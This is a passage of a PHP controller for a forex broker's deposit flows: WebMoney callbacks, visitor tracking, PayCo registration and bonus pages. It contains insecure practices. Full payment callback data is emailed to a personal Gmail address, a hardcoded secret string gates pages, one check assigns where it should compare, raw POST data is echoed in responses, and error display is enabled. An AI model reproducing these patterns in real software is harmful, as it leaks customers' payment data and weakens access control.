                        'LMI_PAYMENT_AMOUNT' => $amount,
                        'LMI_PAYMENT_DESC' => 'ForexMart Deposit (WebMoney - ['.$acc_number.'])',
                        'LMI_PAYMENT_NO' => $data['webmoney_insert']['purchase_num'],
                        'LMI_PAYEE_PURSE' => $data['webmoney_insert']['merchant_purse'],
                        'user_id' => $user_id,
                        'trn_id' => $id,
                        'bonus' => $bonus,
                    ];
                $isSuccess = true;
//                } else {
//                    $isValidationError = false;
//                    $error = array(
//                        'HasError' => $data['CurPendValidation']['TradeError'],
//                        'err'      => $data['CurPendValidation']['TradeErrorMsg']
//                    );
//                }
            } else {
                $isValidationError = false;
                $error = [
                    'amount' => form_error('amount'),
                    'HasError' => true,
                    'err' => validation_errors(),
                ];
            }
            $this->output->set_content_type('application/json')->set_output(json_encode(['success' => $isSuccess, 'error' => $error, 'validation_error' => $isValidationError, 'data' => $data['details'], 'test' => $_POST]));
        }
    }

    public function webmoney_canceled()
    {
        $trn_id = $this->input->post('trn_id', true);
        $user_id = $this->input->post('user_id', true);
        $data = [
            'status' => 1,
            'note' => 'CANCELLED',
        ];
        $this->g_m->update('deposit', 'id', $trn_id, $data);

        $login_type = $this->g_m->showssingle('users', 'id', $user_id, 'login_type');
        if ($login_type['login_type']) {
            $account_detail = $this->account_model->getAccountByPartnerId($user_id);
        } else {
            $account_detail = $this->account_model->getAccountByUserId($user_id);
        }

        $data = [
            'account_number' => $account_detail['account_number'],
            'type' => 'WebMoney',
            'reason' => 'CANCELLED',
        ];
        $this->sendEmailFailedDeposit($data);

        $this->session->set_flashdata('wm_status', 1);

        $this->euRedirect();

        redirect(FXPP::loc_url('deposit/webmoney'));
    }

    public function webmoney_result()
    {
        $response = '';
        foreach ($_POST as $key => $value) {
            $response .= $key.' = '.$value.'<br/>';
        }

        $user_id = $this->input->post('user_id', true);
        $mt_currency = $this->g_m->showssingle('mt_accounts_set', 'user_id', $user_id, 'mt_currency_base');
        $getAccountByUserId = $this->account_model->getAccountByUserId($user_id);

        if (!$getAccountByUserId) {
            $getAccountByUserId = $this->account_model->getAccountByPartnerId2($user_id);
            $mt_currency['mt_currency_base'] = $getAccountByUserId['mt_currency_base'];
            $partnerAccount = true;
        }

        $this->load->library('email');
        $subject = 'WebMoney Deposit Details - Account['.$getAccountByUserId['account_number'].']';
        $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->to('jayhens.snow@gmail.com');
//        $this->email->bcc('jayhens.snow@gmail.com');
        $this->email->subject($subject);
        $this->email->message($response);
        $this->email->send();

        $merchant_purse = $this->input->post('LMI_PAYEE_PURSE', true);
        $customer_purse = $this->input->post('LMI_PAYER_PURSE', true);
        $payment_num = $this->input->post('LMI_SYS_TRANS_NO', true); // Transaction Number
        $purchase_num = $this->input->post('LMI_PAYMENT_NO', true); // Invoice Number
        $account_num = $this->input->post('LMI_SYS_INVS_NO', true); // WM Invoice Number
        $customer_wm_id = $this->input->post('LMI_PAYER_WM', true);
        $amount = $this->input->post('LMI_PAYMENT_AMOUNT', true);
        $customer_ip = $this->input->post('LMI_PAYER_IP', true);
        $date = $this->input->post('LMI_SYS_TRANS_DATE', true);
        $test_mode = $this->input->post('LMI_MODE', true);

        $currency = $mt_currency['mt_currency_base'];
        $get_currency = substr($customer_purse, 0, 1);
        switch ($get_currency) {
            case 'R':
                $currency = 'RUB';
                break;
            case 'E':
                $currency = 'EUR';
                break;
            default:
                $currency = 'USD';
        }

        $control_sign = strtolower($this->input->post('LMI_HASH', true));
        $signature = hash('sha256', $merchant_purse.$amount.$purchase_num.$test_mode.$account_num.$payment_num.$date.$this->secret_key.$customer_purse.$customer_wm_id);
        $deposit_id = $this->input->post('trn_id', true);
        $bonus = $this->input->post('bonus', true);

        $webmoney_details = $this->g_m->showssingle('webmoney_deposit', 'deposit_id', $deposit_id, 'merchant_purse');
        $deposit_details = $this->g_m->showssingle('deposit', 'id', $deposit_id, 'amount,conv_amount,status');

        // Verify payment data through control sign
        if ($control_sign == $signature) {
            // Verify payment amount and merchant purse
            if ($deposit_details['amount'] == $amount && $webmoney_details['merchant_purse'] == $merchant_purse && $deposit_details['status'] != 2) {
                /* FXPP-6333 */
                $currencyStatus = $this->currency_status[$mt_currency['mt_currency_base']];
                $isMicro = $this->account_model->isMicro($user_id);
                if ($isMicro) {
                    $deposit_details['amount'] *= 100;
                    $amount *= 100;
                    $currencyStatus = $this->currency_status['Cents'];
                }
                /* FXPP-6333 */

                $data['deposit_update'] = [
                    'transaction_id' => $payment_num,
                    'status' => 2,
                ];
                $data['webmoney_update'] = [
                    'wm_account_number' => $account_num,
                    'wm_payment_date' => $date,
                    'customer_purse' => $customer_purse,
                    'customer_wm_id' => $customer_wm_id,
                    'customer_ip' => $customer_ip,
                    'real_amount' => $amount,
                ];

                $real_amount = $this->get_convert_amount($currency, $deposit_details['amount'], $mt_currency['mt_currency_base']);
                $conv_amount = $this->get_convert_amount($currency, $deposit_details['amount']);
                $data['deposit_update']['amount'] = $real_amount;
                $data['deposit_update']['conv_amount'] = $conv_amount;
                $config = [
                    'server' => 'live_new',
                ];

                $insertDepositFailed = [
                    'transaction_id	' => $payment_num,
                    'status	' => 0,
                    'amount	' => $real_amount,
                    'currency' => $mt_currency['mt_currency_base'],
                    'user_id' => $user_id,
                    'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                    'transaction_type' => 'WEBMONEY',
                    'payment_status	' => $this->paymentType_status['Deposit via WebMoney'],
                    'currency_status' => $currencyStatus,
                    'fee' => 0,
                    'isFailed' => 0,
                    'type' => 'deposit-'.$isMicro.'-'.$bonus,
                ];

//                $WebService = new WebService($config);

                $account_number = $getAccountByUserId['account_number'];

//                if (IPLoc::APIUpgradeDevIP()) {
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $real_amount, $this->comment_type['deposit'].$this->comment_transaction_type['WEBMONEY'].$payment_num);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
//                } else {
//                    $WebService->update_live_deposit_balance($account_number, $real_amount, $this->comment_type['deposit'].$this->comment_transaction_type['WEBMONEY'].$payment_num);
//                    $requestResult = $WebService->request_status;
//                    $ticket = $WebService->get_result('Ticket');
//                }

                if ($requestResult === 'RET_OK') {
                    $data['deposit_update']['mt_ticket'] = $ticket;

                    // Deposit Bonus 30% / 50% 20%

//                    if ($bonus == 'twpb') {
//                        FXPP::DepositBonus($user_id, $account_number, $real_amount, 'webmoney', 'twpb', $payment_num);
//                    }
//
//                    if ($bonus == 'tpb') {
//                        FXPP::DepositBonus($user_id, $account_number, $real_amount, 'webmoney', 'tpb', $payment_num);
//                    }
//                    if ($bonus == 'fpb') {
//                        FXPP::DepositBonus($user_id, $account_number, $real_amount, 'webmoney', 'fpb', $payment_num);
//                    }
//                    if ($bonus == 'hpb') {
//                        FXPP::Deposit100PercentBonus($user_id, $account_number, $real_amount, 'webmoney', 'hplb', $payment_num);
//                    }

                    self::applyDepositBonus($user_id, $account_number, $real_amount, 'webmoney', $bonus, $payment_num, false);

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $RequestLogintype = $this->account_model->getAccountLoginType($user_id);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($real_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($user_id, $account_number, $real_amount, $payment_num);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $real_amount,
                        'UserId' => $user_id,
                        'TransactionId' => $payment_num,
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $user_id,
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);

                    $WebService2 = new WebService($config);
                    $WebService2->request_live_account_balance($account_number);
                    if ($WebService2->request_status === 'RET_OK') {
                        $balance = $WebService2->get_result('Balance');
                        if ($partnerAccount == true) {
                            $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                        } else {
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $WebService2->request_status;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                } else {
                    $insertDepositFailed['comment'] = $requestResult;
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }

                $this->g_m->update('deposit', 'id', $deposit_id, $data['deposit_update']);
                $this->g_m->update('webmoney_deposit', 'deposit_id', $deposit_id, $data['webmoney_update']);

                /**  Use original amount for Cent accounts**/
                $isMicro = $this->account_model->isMicro($user_id);
                if ($isMicro) {
                    $processed_amount = floatval($conv_amount / 100);
                } else {
                    $processed_amount = floatval($conv_amount);
                }
                /* End **/

                /* Send successful email deposit to auto-reports **/
                $this->sendEmailAfterSuccessDeposit('WEBMONEY', $processed_amount, $account_number, $user_id, $this->comment_type['deposit'].$this->comment_transaction_type['WEBMONEY'].$payment_num);
                /* End **/
            }
        } else {
            $asset_user_docs=$this->config->item('asset_user_docs');
            file_put_contents($asset_user_docs.'webmoney.log', $response.PHP_EOL, FILE_APPEND);

            $login_type = $this->g_m->showssingle('users', 'id', $user_id, 'login_type');
            if ($login_type) {
                if ($partnerAccount == true) {
                    $account_detail = $this->account_model->getAccountByPartnerId2($user_id);
                } else {
                    $account_detail = $this->account_model->getAccountByUserId($user_id);
                }
                if ($account_detail) {
                    $data = [
                        'account_number' => $account_detail['account_number'],
                        'type' => 'WebMoney',
                        'reason' => 'FAILED',
                        'login_type' => $login_type['login_type'],
                    ];
                    $this->sendEmailFailedDeposit($data);
                }
            }
        }
    }

//    public function bank_transfer_idr()
//    {
//        if (IPLoc::for_id_only() or FXPP::isIndonesianCountry() or IPLoc::Office_and_Vpn()) {
//            error_reporting(E_ALL);
//            ini_set('display_errors', 1);
//            if ($this->session->userdata('logged')) {
//
//                $data['active_tab'] = 'finance';
//                $data['active_sub_tab'] = 'deposit';
//
//                $this->template->title(lang('dep_tit'))
//                    ->set_layout('internal/main')
//                    ->prepend_metadata("")
//                    ->build('deposits/deposit-indonesia', $data);
//            } else {
//                redirect('signout');
//            }
//        } else {
//            redirect(FXPP::loc_url('deposit'));
//        }
//    }

    /* public function bank_transfer_myr()
     {
         if (IPLoc::for_my_only() or IPLoc::Office_and_Vpn()) {


             error_reporting(E_ALL);
             ini_set('display_errors', 1);
             if ($this->session->userdata('logged')) {

                 $data['active_tab'] = 'finance';
                 $data['active_sub_tab'] = 'deposit';

                 $this->template->title(lang('dep_tit'))
                     ->set_layout('internal/main')
                     ->prepend_metadata("")
                     ->build('deposits/deposit-malaysia', $data);
             } else {
                 redirect('signout');
             }
         } else {
             redirect(FXPP::loc_url('deposit'));
         }
     }*/

    public function pageVisitor()
    {
        $data = [
            'ip' => $this->input->ip_address(),
            'user_id' => $this->session->userdata('user_id'),
            'session_id' => session_id(),
            'date' => date('Y-m-d'),
            'visit_time' => strtotime(date('Y-m-d H:i')),
            'visit_page' => current_url(),
            'notification_count' => 0,
            'comments' => '',
            'status' => 1,
            'cookie_id' => '',
            'browser' => $this->agent->browser(),
        ];

        $whereData = ['user_id' => $data['user_id'], 'date' => $data['date']];
        $result = $this->general_model->getQueryStringRow('page_visitor', '*', $whereData, 'id', 'DESC', '1');
        if (empty($result) and $data['user_id'] != '') {
            $fcheck = [
                'user_id' => $data['user_id'],
                'status' => 1,
            ];

            $finalCheckN = $this->general_model->getQueryStringRow('page_visitor', '*', $fcheck, 'id', 'DESC', '1');
            $exhousr = $this->getDateDiffer($result->visit_time, date('Y-m-d  H:i'));

            if ($exhousr == '24' or empty($finalCheckN)) {
                $this->general_model->insert('page_visitor', $data);
            }
        }
    }

    public function depositPageVisitorInformatin()
    {
        $data = [
            'ip' => $this->input->ip_address(),
            'user_id' => $this->session->userdata('user_id'),
            'session_id' => session_id(),
            'date' => date('Y-m-d'),
            'visit_time' => strtotime(date('Y-m-d H:i')),
            'visit_page' => $this->input->post('current_url'),
            'notification_count' => 0,
            'comments' => '',
            'status' => 1,
            'cookie_id' => '',
            'browser' => $this->agent->browser(),
        ];

        $whereData = [
            'user_id' => $data['user_id'],
            'notification_count' => $data['notification_count'],
            'status' => $data['status'],
            //  'date!='=>$data['date']
        ];
        $result = $this->general_model->getQueryStringRow('page_visitor', '*', $whereData, 'id', 'DESC', '1');

        if (!empty($result) and $data['user_id'] != '') {
            $fcheck = [
                'user_id' => $data['user_id'],
                //  'ip'=>$data['ip'],
                'date' => date('Y-m-d'),
                'notification_count !=' => 0,
                'status' => 1,
                //  'browser'=>$data['browser']
            ];

            $resultcheck = $this->general_model->getQueryStringRow('page_visitor', '*', $fcheck, 'id', 'DESC', '1');
            if (empty($resultcheck)) {
                unset($fcheck['date']);
                $finalCheckN = $this->general_model->getQueryStringRow('page_visitor', '*', $fcheck, 'id', 'DESC', '1');

                if (!empty($finalCheckN)) {
                    $dbtime = $finalCheckN->visit_time;
                } else {
                    $dbtime = strtotime(date('Y-m-d H:i'));
                }
                $exhousr = $this->getDateDiffer($dbtime, date('Y-m-d  H:i'));

                if ($exhousr == '24' or empty($finalCheckN)) {
                    $uwhereData = ['user_id' => $data['user_id']];
                    $userProfile = $this->general_model->getQueryStringRow('user_profiles', '*', $uwhereData, 'id', 'DESC', '1');

                    $cwhereData = ['user_id' => $data['user_id']];
                    $cserProfile = $this->general_model->getQueryStringRow('contacts', '*', $cwhereData);

                    $countryName = $this->general_model->getCountries($userProfile->country);

                    $edatas['email_data'] = [
                        'Account' => $this->session->userdata('account_number'),
                        'Email' => $this->session->userdata('email'),
                        'Phone ' => (($cserProfile->phone1) ? $cserProfile->phone1 : $cserProfile->phone2),
                        'City' => $userProfile->city,
                        'Country' => $countryName,
                        'Name' => $userProfile->full_name,
                        'Status' => 'Interested',
                    ];

                    $cCountryName = $userProfile->country;
                    $countryArray = ['ID', 'IDR', 'MY', 'MYR'];
                    //      if(in_array($cCountryName, $countryArray))

                    if (IPLoc::for_id_only() || IPLoc::for_my_only()) {
                        if (IPLoc::for_id_only()) {
                            $subject = 'Active Indonesian Client Report';
                            $edatas['email_data']['heading'] = 'Active Indonesian Client Report';
                            $this->general_model->sendEmailVisitor('default_mail', $subject, 'id_a_clients@forexmart.com', $edatas, $config, null);
                        }
                        if (IPLoc::for_my_only()) {
                            $subject = 'Active Malaysian Client Report';
                            $edatas['email_data']['heading'] = 'Active Malaysian Client Report';
                            $this->general_model->sendEmailVisitor('default_mail', $subject, 'my_a_clients@forexmart.com', $edatas, $config, null);
                        }

                        $updatedata = ['notification_count' => 1];
                        $this->general_model->update('page_visitor', 'id', $result->id, $updatedata);
                        echo 'Mail send';
                    } else {
                        echo 'Not country match';
                    }
                } else {
                    echo '24 hour not complite';
                }
            } else {
                echo 'This day already notified';
            }
        }
    }

    public function getDateDiffer($dbTime, $currentTime)
    {
        $diff = ((strtotime($currentTime)) - $dbTime);
        $y = 60 * 60 * 24 * 365;
        $m = 60 * 60 * 24 * 30;
        $d = 60 * 60 * 24;
        $h = 60 * 60;

        $yy = floor($diff / $y);
        $mm = floor($diff / $m);
        $dd = floor($diff / $d);
        $hh = floor($diff / $h);

        $result = 0;
        if ($yy > 0 or $mm > 0 or $dd > 0 or $hh > 23) {
            $result = '24';
        }

        return $result;
    }

    public function getPaycoRegURLToken()
    {
        if (!$this->input->is_ajax_request()) {
            die('Not authorized!');
        }
        if ($this->session->userdata('logged')) {
            $this->load->helper('email');

            $payco_email = $this->input->post('email');

            if (!preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $payco_email)) {
                $return['email'] = $payco_email;
                $return['isSuccess'] = false;
                $return['error'] = 'You&#39;ve entered an invalid email format. Please try again.';
            } else {
                $client = $this->input->post('acc_num');
                $sending_email = $payco_email;

                if ($this->account_model->getUserDetailsByAccountNumber($client)) {
                    if (!$client) {
                        $user_id = $this->session->userdata('user_id');
                        $user_info = $this->account_model->getAccountByPartnerId($user_id);
                        $account_number = $user_info['account_number'];
                    } else {
                        $user_info = $this->account_model->getUserDetailsByAccountNumber($client);
                        $user_id = $user_info['user_id'];
                        $account_number = $client;
                    }

                    $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'full_name, dob, street, city, state, zip');
                    $contact_info = $this->general_model->showssingle('contacts', 'user_id', $user_id, 'phone1');
                    $checkContactLength = strlen($contact_info['phone1']);

                    $return = [
                        'isSuccess' => false,
                        'email' => $payco_email,
                        'error' => 'Unable to generate PayCo Registration Link. Please try again',
                        'reglink' => '',
                    ];

                    $check_payco_email = $this->partners_model->getITSRegistrationAttemptPayCoAccountByUserId($user_id);

                    if (!$check_payco_email) {
                        if ($user_info['dob'] == '' || $user_info['street'] == '' || $user_info['city'] == '' || $user_info['state'] == '' || $user_info['zip'] == '' || $contact_info['phone1'] == '' || $checkContactLength < 8) {
                            if (!$client) {
                                $return['error'] = 'Please complete your information first. Update your information <a href="'.base_url('profile/edit').'">here</a>.';
                            } else {
                                $return['error'] = 'Affiliate information is incomplete. Please request Affiliate to complete and update information to enable PayCo Registration.';
                            }
                        } else {
                            $regKeyData = FXPP::PayCo_generateURLToken($payco_email);

                            if (!$regKeyData['isError']) {
                                $return['isSuccess'] = true;
                                $return['error'] = '';

                                $managePaycoRegistration = [
                                    'user_id' => $user_id,
                                    'status' => 0,  // pending
                                    'preferred_payco_email' => $payco_email,
                                    'link' => $regKeyData['data']['FullURL'],
                                    'token' => $regKeyData['data']['Token'],
                                    'created_date' => date('Y-m-d H:i:s', strtotime('now')),
                                ];

                                $this->g_m->insert('manage_payco_registration', $managePaycoRegistration);
                            } else {
                                $return['error'] = $regKeyData['message'];
                            }
                        }
                    } else {
                        $checkStatus = $this->partners_model->getITSRegisteredPayCoAccountByUserId($user_id);
                        if (!$client) {
                            if ($checkStatus) {
                                $return['error'] = 'PayCo Registration for Account Number '.$account_number.' is already processed. Please check the mail sent to <b>'.$check_payco_email['preferred_payco_email'].'</b>.';
                            } else {
                                $return['error'] = 'PayCo Registration for '.$check_payco_email['preferred_payco_email'].' is already on process. Admin will review registration and send an email for more information.';
                            }
                        } else {
                            if ($checkStatus) {
                                $return['error'] = 'PayCo Registration for Referred Client Account Number <b>'.$client.'</b> is already processed. Please check the mail sent to <b>'.$check_payco_email['preferred_payco_email'].'</b>.';
                            } else {
                                $return['error'] = 'PayCo Registration for Referred Client Account Number <b>'.$client.'</b> is already on process. Admin will review registration and send an email to <b>'.$check_payco_email['preferred_payco_email'].'</b> for more information.';
                            }
                        }
                    }
                } else {
                    $return['error'] = 'Account Number does not exist.';
                }
            }

            $this->output->set_content_type('application/json')
                ->set_output(
                    json_encode(
                        [
                            'email' => $return['email'],
                            'success' => $return['isSuccess'],
                            'error' => $return['error'],
                            'reglink' => $return['reglink'],
                            'result' => $regKeyData,
                            'check' => $check_payco_email,
                            'id' => $this->session->userdata('user_id'),
                        ]
                    )
                );
        }
    }

    public function sendSupportMail($acc_num)
    {
        $this->load->library('Fx_mailer');

        $data['title'] = 'PayCo Registration Link - Account['.$acc_num.']';
        $data['paragraph'] = '<p style="font-size: 14px;">PayCo Registration link is accessed by Account ['.$acc_num.'].</p><p style="font-size: 14px;">Please see progress on this <a href="http://m7.forexmart.com/administration/manage-payco-registration?type=0">link</a>.</p>';

        $message = Fx_mailer::custom_sendmail_support($data);
        $this->load->library('email');

        $config = [
            'mailtype' => 'html',
        ];

        if ($config != null) {
            $this->email->initialize($config);
        }

        $this->SMTPDebug = 1;
        $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->to('partnership@forexmart.com');
        $this->email->bcc('iahrpel@gmail.com');
        $this->email->subject('Accessed PayCo Registration Link');
        $this->email->message($message);

        if (!$this->email->send()) {
            echo $this->email->print_debugger();
        }
    }

    public function test_forexmart_limited_bonus()
    {
        $this->lang->load('depositwithdraw');
        if ($this->session->userdata('logged')) {
            $current_time = strtotime(date('Y-m-d  H:i'));
            $intertime = 60 * 60 * 24 * 2; //60*1*2;//60*60*24*2;
            $cookieData = get_cookie('countdown');
            $cookieData = intval($cookieData);
            $current_time = intval($current_time);
            $expaneTime = $current_time - $cookieData;
            $newTime = $intertime - $expaneTime;
            $condition = false;
            // $data['secret'] = $this->input->post('secret',true);
            // if ($data['secret']=='67fyuvhbk901u2iohkje7iuj45etdg789oiyhkj67ryufgh') {
            //     $condition = false;
            // }else{
            //     if(get_cookie('countdown')!=NULL) {
            //         $condition = false;
            //             if ($newTime < 0) {
            //                 $condition = true;
            //             }else{
            //                 $condition = false;
            //             }
            //     }else{
            //         $condition = true;
            //     }
            // }
            // if($condition){
            //     redirect('deposit');
            // }
            $data['title_page'] = lang('sb_li_2');
            // // $data['active_tab'] = 'finance';+
            // // $data['active_sub_tab'] = 'deposit';+
            // $data['metadata_description'] = lang('dep_dsc');
            // $data['metadata_keyword'] = lang('dep_kew');
            $pnl['panel_banktransfer'] = $this->load->view('deposit_widget/banktransfer', null, true);
            $pnl['panel_visa_mastercard'] = $this->load->view('deposit_widget/visa-mastercard', null, true);
            $pnl['panel_skrill'] = $this->load->view('deposit_widget/skrill', null, true);
            $pnl['panel_neteller'] = $this->load->view('deposit_widget/neteller', null, true);
            $pnl['panel_paxum'] = $this->load->view('deposit_widget/paxum', null, true);
            $pnl['panel_paypal'] = $this->load->view('deposit_widget/paypal', null, true);
            $pnl['panel_webmoney'] = $this->load->view('deposit_widget/webmoney', null, true);
            $pnl['panel_payco'] = $this->load->view('deposit_widget/payco', null, true);
            $pnl['panel_paysera'] = $this->load->view('deposit_widget/paysera', null, true);
            $pnl['panel_qiwi'] = $this->load->view('deposit_widget/qiwi', null, true);
            $pnl['panel_megatransfer'] = $this->load->view('deposit_widget/megatransfer', null, true);
            $pnl['panel_bitcoin'] = $this->load->view('deposit_widget/bitcoin', null, true);
            $pnl['panel_yandexmoney'] = $this->load->view('deposit_widget/yandexmoney', null, true);
            $data['show_deposit'] = '';
            $data['show_modal'] = '';

            $nuser_id = $this->session->userdata('new_reg_id');
            $this->template->title(lang('dep_tit'))
                ->set_layout('internal/main')
                ->prepend_metadata('')
                ->build('deposits/limited_bonus', $data);
        } else {
            $data['secret'] = $this->input->post('secret', true);
            if ($data['secret'] != '67fyuvhbk901u2iohkje7iuj45etdg789oiyhkj67ryufgh') {
                redirect('client/signin');
            }
            $_SESSION['redirect'] = $this->config->item('domain-my').$_SERVER['REQUEST_URI'];
            redirect('client/signin');
        }
    }

    public function forexmart_limited_bonus()
    {
        if (!IPLOC::Office()) {
            redirect(FXPP::my_url('my-account'));
        }

        if ($this->session->userdata('logged')) {
            $this->lang->load('depositwithdraw');
            $user_id = $this->session->userdata('user_id');
            // limitedBonusTimeCount
            $this->account_model->limitedBonusTimeCount(['user_id' => $user_id, 'login_time' => date('Y-m-d h:i:s'), 'type' => 0]);
            $mtas2 = $this->general_model->showssingle($table = 'mt_accounts_set', $id = 'user_id', $field = $user_id, $select = 'mt_currency_base');

            switch ($mtas2['mt_currency_base']) {
                case 'RUB':
                    $depositAmount = ['1000000', '500000', '300000', '100000', '50000', '30000', '10000 ', '5000', '3000', '1000', '500'];
                    $currency1 = '<i class="fa fa-rub" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-rub" aria-hidden="true"></i>';
                    break;
                case 'GBP':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '<i class="fa fa-gbp" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-gbp" aria-hidden="true"></i>';
                    break;
                case 'EUR':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '<i class="fa fa-eur" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-eur" aria-hidden="true"></i>';
                    break;
                default:
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '<i class="fa fa-usd" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-usd" aria-hidden="true"></i>';
            }

            $data['depositAmount'] = $depositAmount;
            $data['currency'] = $currency1;
            $data['currency2'] = $currency2;

            $current_time = strtotime(date('Y-m-d  H:i'));
            $intertime = 60 * 60 * 24 * 2; //60*1*2;//60*60*24*2;
            $cookieData = get_cookie('countdown');
            $cookieData = intval($cookieData);
            $current_time = intval($current_time);
            $expaneTime = $current_time - $cookieData;
            $newTime = $intertime - $expaneTime;
            $condition = false;
            $data['secret'] = $this->input->post('secret', true);
            if ($data['secret'] == '67fyuvhbk901u2iohkje7iuj45etdg789oiyhkj67ryufgh') {
                $condition = false;
            } else {
                // $condition = true;
                if ($_SESSION['redirect'] != null) {
                    $condition = false;
                    $_SESSION['redirect'] = null;
                // if ($newTime < 0) {
                    //     $condition = true;
                    // }else{
                    //     $condition = false;
                    // }
                } else {
                    $condition = true;
                }

                // if(IPLoc::Office()){
                //     echo $_SESSION['redirect'];
                //     exit;
                // }
            }
            if ($condition) {
                redirect('deposit');
            }
            $data['active_tab'] = 'finance';
            $data['active_sub_tab'] = 'deposit';
            $data['title_page'] = lang('sb_li_2');
            // // $data['active_tab'] = 'finance';+
            // // $data['active_sub_tab'] = 'deposit';+
            // $data['metadata_description'] = lang('dep_dsc');
            // $data['metadata_keyword'] = lang('dep_kew');
            $pnl['panel_banktransfer'] = $this->load->view('deposit_widget/banktransfer', null, true);
            $pnl['panel_visa_mastercard'] = $this->load->view('deposit_widget/visa-mastercard', null, true);
            $pnl['panel_skrill'] = $this->load->view('deposit_widget/skrill', null, true);
            $pnl['panel_neteller'] = $this->load->view('deposit_widget/neteller', null, true);
            $pnl['panel_paxum'] = $this->load->view('deposit_widget/paxum', null, true);
            $pnl['panel_paypal'] = $this->load->view('deposit_widget/paypal', null, true);
            $pnl['panel_webmoney'] = $this->load->view('deposit_widget/webmoney', null, true);
            $pnl['panel_payco'] = $this->load->view('deposit_widget/payco', null, true);
            $pnl['panel_paysera'] = $this->load->view('deposit_widget/paysera', null, true);
            $pnl['panel_qiwi'] = $this->load->view('deposit_widget/qiwi', null, true);
            $pnl['panel_megatransfer'] = $this->load->view('deposit_widget/megatransfer', null, true);
            $pnl['panel_bitcoin'] = $this->load->view('deposit_widget/bitcoin', null, true);
            $pnl['panel_yandexmoney'] = $this->load->view('deposit_widget/yandexmoney', null, true);
            $data['show_deposit'] = '';
            $data['show_modal'] = '';

            $nuser_id = $this->session->userdata('new_reg_id');
            $this->template->title(lang('dep_tit'))
                ->set_layout('internal/main')
                ->prepend_metadata('')
                ->build('deposits/limited_bonus_test', $data);
        } else {
            $data['secret'] = $this->input->post('secret', true);
            if ($data['secret'] = '67fyuvhbk901u2iohkje7iuj45etdg789oiyhkj67ryufgh') {
                $_SESSION['redirect'] = $this->config->item('domain-my').$_SERVER['REQUEST_URI'];
                redirect('client/signin');
            }
            redirect('client/signin');
        }
    }

    /*public function testTicket() {
        $mt_ticket = $this->deposit_model->getDepositTicketByUser(87430);

        $comment = [];
        $where = 'transaction_id';

        $webservice_config = array(
            'server' => 'live_new'
        );
        $WebService = new WebService($webservice_config);

        foreach ($mt_ticket as $key => $value) {
            $WebService->temp_get_finance_record_by_ticket($value['mt_ticket']);
            if($WebService->request_status === 'RET_OK'){
                $comment = $WebService->get_result('Comment');
            }

            $explodeComment = explode('_', $comment);
            $depositType = $explodeComment[0];
            $transactionType = $explodeComment[1];
            $transactionId = $explodeComment[2];

            switch ($transactionType) {
                case 'CP':
                    $where = 'reference_id';
                    break;
            }
        }

        $query = $this->deposit_model->getSumOfDepositFee(87430, $where, $transactionId);
        echo '<pre>';
        print_r($query);
        echo '</pre>';


        exit;
    }*/

    public function depositPageOld()
    {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
        $this->lang->load('depositwithdraw');
        if ($this->session->userdata('logged')) {
            if (!IPLoc::Office()) {
                FXPP::LoginTypeRestriction();
            }
            $data['title_page'] = lang('sb_li_2');
            $data['active_tab'] = 'finance';
            $data['active_sub_tab'] = 'deposit';
            $data['metadata_description'] = lang('dep_dsc');
            $data['metadata_keyword'] = lang('dep_kew');

            $q = $this->general_model->showssingle2($table = 'user_profiles', $field = 'user_id', $id = $_SESSION['user_id'], $select = 'country');

            //r1 c1234
            $pnl['panel_banktransfer'] = $this->load->view('deposit_widget/banktransfer', null, true);
            $pnl['panel_visa_mastercard'] = $this->load->view('deposit_widget/visa-mastercard', null, true);
            $pnl['panel_skrill'] = $this->load->view('deposit_widget/skrill', null, true);
            $pnl['panel_neteller'] = $this->load->view('deposit_widget/neteller', null, true);

            //r2 c1234
            $pnl['panel_paxum'] = $this->load->view('deposit_widget/paxum', null, true);
            $pnl['panel_paypal'] = $this->load->view('deposit_widget/paypal', null, true);
            $pnl['panel_webmoney'] = $this->load->view('deposit_widget/webmoney', null, true);
            $pnl['panel_payco'] = $this->load->view('deposit_widget/payco', null, true);

            //r3 c1234
            $pnl['panel_paysera'] = $this->load->view('deposit_widget/paysera', null, true);
            $pnl['panel_qiwi'] = $this->load->view('deposit_widget/qiwi', null, true);
            $pnl['panel_megatransfer'] = $this->load->view('deposit_widget/megatransfer', null, true);
            $pnl['panel_bitcoin'] = $this->load->view('deposit_widget/bitcoin', null, true);

            $pnl['panel_yandexmoney'] = $this->load->view('deposit_widget/yandexmoney', null, true);
            $pnl['panel_deposit_monetaru'] = $this->load->view('deposit_widget/deposit-monetaru', null, true);
            $pnl['panel_sofort'] = $this->load->view('deposit_widget/sofort', null, true);

